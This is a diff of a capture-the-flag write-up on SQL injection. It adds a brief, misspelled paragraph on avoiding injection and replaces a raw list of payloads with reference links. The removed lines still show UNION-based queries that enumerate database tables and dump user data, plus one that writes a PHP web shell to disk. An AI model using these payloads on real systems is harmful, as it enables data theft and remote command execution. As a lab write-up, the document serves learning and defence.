@@ -243,6 +243,7 @@ There you go, we have found the flag.
 
 # How to avoid the problem
 
+Sql injection could be a dengerouis problem which could as fas as compromise the whole system. in our situation the programmer used the raw **user input** data inside the query which in turn let the user control what the quert string becomes and so the result is given. This kind of situation can be avoided easily by not using the user input directly in our string.
 
 # Flag
 
@@ -252,27 +253,9 @@ There you go, we have found the flag.
 
 # Resources
 
-
-
-------
-1 and 1=0 UNION SELECT null, table_name FROM information_schema.tables limit 0,50 --
-1 AND 1=2 UNION SELECT null, table_name FROM information_schema.tables 
-
-1=0 UNION SELECT 1, (group_concat(column_name)from(information_schema.columns)where(table_name)=(0x7573657273)) --
-1 AND 1=0 UNION SELECT NULL, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273)#
-
-
-1 or 1 UNION select table_name, column_name FROM information_schema.columns
-
-
-1 union select 1, "<?php system($_GET['cmd']); ?>" into outfile "./test01.php"
-
-1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
-
-```sql
-
-1 AND 1=0 UNION SELECT 1, (SELECT Stuff((SELECT N', ' + first_name FROM users FOR XML PATH(''),TYPE).value('text()[1]','nvarchar(max)'),1,2,N''))
-
-1 AND 1=0 UNION SELECT 1, CONCAT(CHAR(124), user_id, CHAR(124), first_name, CHAR(124), last_name, CHAR(124), town, CHAR(124), country, CHAR(124), planet, CHAR(124), Commentaire, CHAR(124), countersign, CHAR(124)) AS name FROM users --
-
-```
+- [How to Concatenate String and NULL Values in SQL Server](https://learnsql.com/cookbook/how-to-concatenate-string-and-null-values-in-sql-server/)
+- [SQL CONCATENATE (appending strings to one another)](https://www.sqlbook.com/sql-string-functions/sql-concatenate/)
+- [Exploiting SQL Injection: a Hands-on Example](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)
+- [SQL Injection | Complete Guide](https://www.youtube.com/watch?v=1nJgupaUPEQ)
+- [SQL Injections: The Free 2021 Full Course](https://www.youtube.com/watch?v=fiq59DuhY68)
+- [DEFCON 17: Advanced SQL Injection](https://www.youtube.com/watch?v=rdyQoUNeXSg)
